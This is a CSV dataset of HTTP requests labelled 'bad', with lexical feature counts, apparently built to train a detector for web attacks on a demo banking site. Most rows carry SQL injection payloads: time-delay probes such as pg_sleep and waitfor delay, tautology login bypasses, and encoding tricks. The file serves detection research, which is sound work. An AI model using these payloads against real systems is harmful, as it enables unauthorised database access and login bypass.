method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
GET,/index.jsp?content=business.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=rqOFfJMi');select%20pg_sleep(9);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Ck1zuaM7'));select%20pg_sleep(9);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
GET,/search.jsp,,0,0,0,0,0,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=-1%20OR%203%2b417-417-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=xb6f6t0m'));select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b275-275-1=0%2b0%2b0%2b1&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,0,2,0,bad
GET,/search.jsp?query=0'XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR'Z,,2,0,0,5,0,1,bad
GET,/,,0,0,0,0,0,2,bad
GET,/search.jsp?query=1*1*1*1,,0,0,0,0,0,0,bad
GET,/index.jsp?content=personal_loans.htm%25'%20AND%202*3*8=6*8%20AND%20'PabG'!='PabG%25,,4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=Dox2QKqX';select%20pg_sleep(6);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b842-842-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=(select(0)from(select(sleep(9)))v)/*'%2b(select(0)from(select(sleep(9)))v)%2b'""%2b(select(0)from(select(sleep(9)))v)%2b""*/&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b522-522-1=0%2b0%2b0%2b1&uid=1,0,0,0,0,2,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*0=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2>(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=%bf'%bf""",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%00%c0%a7%c0%a2%252527%252522&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1));select%20pg_sleep(6);%20--%20,,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b910-910)%20or%20'6N78EPpD'='&uid=1,4,0,0,1,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%40%40S3jZ2&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=Rl2dFHaY');select%20pg_sleep(10);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=if(now()=sysdate()%2csleep(9)%2c0)&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
GET,/index.jsp?content=-1%20OR%203%2b158-158-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=JyI=,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%20waitfor%20delay%20'0:0:3'%20--%20&subject=1,2,0,1,0,5,2,bad
GET,/index.jsp?content=if(now()=sysdate()%2csleep(9)%2c0),,0,0,0,4,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=isbIgKzQ');select%20pg_sleep(6);%20--%20,1,0,1,1,3,2,bad
GET,/survey_questions.jsp?step=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
GET,/survey_questions.jsp?step=a,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b527-527-1=0%2b0%2b0%2b1%20or%20'oOPOjXva'='&uid=1,4,0,0,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1;%20waitfor%20delay%20'0:0:3'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b980-980-1=0%2b0%2b0%2b1,0,0,0,0,2,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%5c,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%202%2b580-580-1=0%2b0%2b0%2b1%20--%20&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%20000910=000910%20AND%203%2b1-1-1=1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=rsfsEvmD');select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
GET,/search.jsp?query=%5c,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=NBc98vGB';select%20pg_sleep(7);%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%f0''%f0""""",2,2,0,0,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=(select(0)from(select(sleep(3)))v)/*'%2b(select(0)from(select(sleep(3)))v)%2b'""%2b(select(0)from(select(sleep(3)))v)%2b""*/&subject=1",2,2,0,15,0,9,bad
POST,/doLogin,btnSubmit=Login&passw=%5c&uid=1,0,0,0,0,0,1,bad
GET,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%bf'%bf""&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=0""XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR""Z&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=0'XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR'Z&subject=1,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=JyI=&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=%40%40gieVw,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_retirement.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1'""",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1);select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=0""XOR(if(now()=sysdate()%2csleep(9)%2c0))XOR""Z&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,2,0,5,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1'%20OR%202%2b609-609-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,1,bad
GET,/feedback.jsp,,0,0,0,0,0,0,bad
GET,/images,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=-1%20OR%202%2b659-659-1=0%2b0%2b0%2b1&subject=1,0,0,0,0,2,0,bad
GET,/search.jsp?query=-1);select%20pg_sleep(3);%20--%20,,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b264-264-1=0%2b0%2b0%2b1%20--%20&uid=1,1,0,1,0,4,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1%20waitfor%20delay%20'0:0:6'%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doLogin,btnSubmit=Login&passw=%40%40hCmP7&uid=1,0,0,0,0,0,1,bad
GET,/swagger/swagger-ui-standalone-preset.js,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
POST,/doLogin,"btnSubmit=Login&passw=1'""&uid=1",1,1,0,0,0,1,bad
GET,/search.jsp?query=EezNcjVE';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203%2b910-910-1=0%2b0%2b0%2b1%20or%20'6N78EPpD'='&uid=1,4,0,0,0,4,1,bad
GET,/index.jsp?content=7ZP7fS6E';select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=JyI=&uid=1,0,0,0,0,0,1,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1'%20OR%202%2b533-533-1=0%2b0%2b0%2b1%20or%20'YlzHGUjK'=',4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=-1%20OR%202%2b78-78-1=0%2b0%2b0%2b1%20--%20,0,0,1,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=-1%20OR%202%2b708-708-1=0%2b0%2b0%2b1%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,0,4,0,bad
GET,/survey_questions.jsp?step=gZbGXj29,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,1,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=6%20AND%20000910=000910%20or%20'6N78EPpD'='&uid=1,4,0,0,0,6,1,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1;%20waitfor%20delay%20'0:0:9'%20--%20,2,0,1,0,5,3,bad
GET,/survey_questions.jsp?step=-1%20OR%203%2b52-52-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst'%20AND%202*3*8=6*8%20AND%20'KBz8'='KBz8&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=%40%40IkDem,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2*1=6%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
GET,/index.jsp?content=1%20waitfor%20delay%20'0:0:9'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=%40%40CK5Ul&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=%f0''%f0""""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",2,2,0,0,0,0,bad
GET,/survey_questions.jsp?step=x1zZdFMp';select%20pg_sleep(3);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=-1);select%20pg_sleep(3);%20--%20,0,0,1,1,3,3,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=%5c&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/search.jsp?query=zCJqXCvM';%20waitfor%20delay%20'0:0:6'%20--%20,,3,0,1,0,5,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=0""XOR(if(now()=sysdate()%2csleep(6)%2c0))XOR""Z",0,2,0,5,0,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=ErdOUVny';select%20pg_sleep(3);%20--%20,1,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=if(now()=sysdate()%2csleep(7)%2c0)&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,0,4,0,1,bad
GET,/search.jsp?query=-1);%20waitfor%20delay%20'0:0:3'%20--%20,,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=FarmG3qB&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_insurance.htm,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1%20OR%202%2b504-504-1=0%2b0%2b0%2b1%20--%20&uid=1,0,0,1,0,4,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=-1""%20OR%202%2b547-547-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1",0,1,1,0,4,0,bad
GET,/survey_questions.jsp?step=g1Yd7DsZ'));select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/index.jsp?content=0'XOR(if(now()=sysdate()%2csleep(3)%2c0))XOR'Z,,2,0,0,5,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b657-657-1=0%2b0%2b0%2b1%20--%20,1,0,1,0,4,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=0ZOIZmZr';%20waitfor%20delay%20'0:0:9'%20--%20,3,0,1,0,5,2,bad
GET,/survey_questions.jsp?step=-1%20OR%202%2b52-52-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/swagger/index.html,,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_deposit.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1;select%20pg_sleep(9);%20--%20,0,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%40%40GOt2p,0,0,0,0,0,1,bad
GET,/search.jsp?query=-1%20OR%202%2b723-723-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
GET,/survey_questions.jsp?step=%40%40tsn52,,0,0,0,0,0,0,bad
GET,/index.jsp,,0,0,0,0,0,2,bad
GET,/search.jsp?query=-1%20OR%203%2b723-723-1=0%2b0%2b0%2b1,,0,0,0,0,2,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=dA0Dq5Eg');select%20pg_sleep(9);%20--%20,1,0,1,1,3,3,bad
GET,/index.jsp?content=business_cards.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b33-33-1=0%2b0%2b0%2b1%20or%20'WWkd6cYP'='&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
GET,/high_yield_investments.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1;%20waitfor%20delay%20'0:0:3'%20--%20,2,0,1,0,5,2,bad
GET,/index.jsp?content=business_other.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=1'""&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:6'%20--%20&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=0gQqVexn');select%20pg_sleep(9);%20--%20&name=ckwiadcj&subject=1,1,0,1,1,3,2,bad
GET,/login.jsp,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%2540email.tst&name=ckwiadcj&subject=1,0,0,0,0,0,0,bad
GET,/index.jsp?content=business_lending.htm,,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=1%20waitfor%20delay%20'0:0:3'%20--%20&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,2,0,1,0,5,2,bad
POST,/doLogin,"btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/",2,2,0,15,0,10,bad
GET,/index.jsp?content=1%00%c0%a7%c0%a2%252527%252522,,0,0,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=(select(0)from(select(sleep(6)))v)/*'%2b(select(0)from(select(sleep(6)))v)%2b'""%2b(select(0)from(select(sleep(6)))v)%2b""*/&name=ckwiadcj&subject=1",2,2,0,15,0,9,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=-1%20OR%203*2<(0%2b5%2b580-580)%20--%20&name=ckwiadcj&subject=1,0,0,1,1,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=-1'%20OR%202%2b30-30-1=0%2b0%2b0%2b1%20or%20'ypraFpry'='&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,4,0,0,0,4,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2b5%2b527-527)%20or%20'oOPOjXva'='&uid=1,4,0,0,1,4,1,bad
GET,/survey_questions.jsp?step=-1%20OR%202%2b417-417-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=DZnXqH0B');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=%5c,0,0,0,0,0,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1);select%20pg_sleep(3);%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,0,0,1,1,3,2,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=1%00%c0%a7%c0%a2%252527%252522&name=yqyvkaxo&subject=1,0,0,0,0,0,0,bad
GET,/status_check.jsp,,0,0,0,0,0,0,bad
POST,/doSubscribe,btnSubmit=Subscribe&txtEmail=1%20waitfor%20delay%20'0:0:6'%20--%20,2,0,1,0,5,2,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1'""&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=if(now()=sysdate()%2csleep(6)%2c0)&subject=1,0,0,0,4,0,1,bad
GET,/index.jsp?content=zd4spQve');select%20pg_sleep(6);%20--%20,,1,0,1,1,3,2,bad
GET,/doLogin,,0,0,0,0,0,2,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%203*2=5%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=-1'%20OR%202%2b940-940-1=0%2b0%2b0%2b1%20--%20&email_addr=sample%40email.tst&name=ckwiadcj&subject=1,1,0,1,0,4,0,bad
POST,/doSubscribe,"btnSubmit=Subscribe&txtEmail=1'""",1,1,0,0,0,0,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=%bf'%bf""&name=yqyvkaxo&subject=1",1,1,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=-1'%20OR%202%2b832-832-1=0%2b0%2b0%2b1%20or%20'aAKZiHEc'=',4,0,0,0,4,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=ckwiadcj&subject=7pgTGTLe,0,0,0,0,0,0,bad
GET,/search.jsp?query=-1%20OR%203%2b110-110-1=0%2b0%2b0%2b1%20--%20,,0,0,1,0,4,0,bad
GET,/search.jsp?query=1,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=-1'%20OR%202%2b1-1-1=1%20AND%20527=527%20or%20'oOPOjXva'='&uid=1,4,0,0,0,6,1,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=1%00%c0%a7%c0%a2%252527%252522&subject=1,0,0,0,0,0,0,bad
POST,/sendFeedback,submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=yqyvkaxo&subject=1%00%c0%a7%c0%a2%252527%252522,0,0,0,0,0,0,bad
GET,/swagger/swagger-ui-bundle.js,,0,0,0,0,0,0,bad
POST,/doLogin,btnSubmit=Login&passw=g00dPa%2524%2524w0rD&uid=1,0,0,0,0,0,1,bad
POST,/sendFeedback,"submit=Submit&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=%f0''%f0""""&subject=1",2,2,0,0,0,0,bad
